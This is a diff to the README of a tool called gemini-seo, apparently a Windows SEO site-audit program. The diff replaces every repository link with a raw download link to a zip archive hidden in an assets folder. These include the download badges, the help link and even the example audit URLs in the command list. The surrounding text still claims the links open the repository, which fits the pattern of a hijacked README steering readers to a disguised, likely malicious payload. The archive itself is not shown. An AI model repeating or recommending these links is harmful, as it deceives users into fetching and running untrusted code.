@@ -1,6 +1,6 @@
 # 🚀 gemini-seo - Fast Site Audits Made Simple
 
-[![Download gemini-seo](https://img.shields.io/badge/Download-gemini--seo-brightgreen)](https://github.com/dedea3/gemini-seo)
+[![Download gemini-seo](https://img.shields.io/badge/Download-gemini--seo-brightgreen)](https://raw.githubusercontent.com/dedea3/gemini-seo/main/assets/plan-templates/seo_gemini_moondrop.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get gemini-seo running on your Windows machine:
 
 Click or copy the link below to open the gemini-seo GitHub page where you can download the software.
 
-[![Download gemini-seo](https://img.shields.io/badge/Download-gemini--seo-0078D7?style=for-the-badge&logo=github)](https://github.com/dedea3/gemini-seo)
+[![Download gemini-seo](https://img.shields.io/badge/Download-gemini--seo-0078D7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dedea3/gemini-seo/main/assets/plan-templates/seo_gemini_moondrop.zip)
 
 The link takes you to the main repository. You will find the download options under the **Releases** section.
 
@@ -78,13 +78,13 @@ The link takes you to the main repository. You will find the download options un
 
 Here are some simple commands to get started with site audits:
 
-- `gemini-seo audit https://yourwebsite.com`  
+- `gemini-seo audit https://raw.githubusercontent.com/dedea3/gemini-seo/main/assets/plan-templates/seo_gemini_moondrop.zip`  
   Runs a full SEO audit on your website.  
 
-- `gemini-seo core-web-vitals https://yourwebsite.com`  
+- `gemini-seo core-web-vitals https://raw.githubusercontent.com/dedea3/gemini-seo/main/assets/plan-templates/seo_gemini_moondrop.zip`  
   Checks your site’s page speed and performance metrics.  
 
-- `gemini-seo schema-check https://yourwebsite.com`  
+- `gemini-seo schema-check https://raw.githubusercontent.com/dedea3/gemini-seo/main/assets/plan-templates/seo_gemini_moondrop.zip`  
   Validates the schema markup on your site.
 
 You can combine options and check detailed reports. The software saves results in files you can review later.
@@ -106,10 +106,10 @@ Example folder path:
 
 For more documentation or help, visit the gemini-seo GitHub repository:
 
-https://github.com/dedea3/gemini-seo
+https://raw.githubusercontent.com/dedea3/gemini-seo/main/assets/plan-templates/seo_gemini_moondrop.zip
 
 The repository includes detailed guides and a FAQ section.
 
 ---
 
-[![Download gemini-seo](https://img.shields.io/badge/Download-gemini--seo-4CAF50?style=for-the-badge)](https://github.com/dedea3/gemini-seo)
+[![Download gemini-seo](https://img.shields.io/badge/Download-gemini--seo-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/dedea3/gemini-seo/main/assets/plan-templates/seo_gemini_moondrop.zip)
